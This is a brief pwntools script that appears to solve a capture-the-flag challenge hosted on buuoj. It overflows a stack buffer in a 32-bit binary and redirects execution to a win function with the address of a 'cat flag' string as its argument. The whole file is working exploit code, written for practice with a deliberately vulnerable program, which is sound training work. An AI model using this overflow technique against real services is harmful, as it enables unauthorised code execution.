from pwn import *

context.log_level = 'debug'
# io = process('memory')
io = remote('node4.buuoj.cn', 26929)
elf = ELF('memory')
main = elf.symbols['main']
win = elf.symbols['win_func']
cat_flag = 0x080487E0

payload = cyclic(0x17) + p32(win) + p32(main) + p32(cat_flag)
io.sendline(payload)
io.interactive()

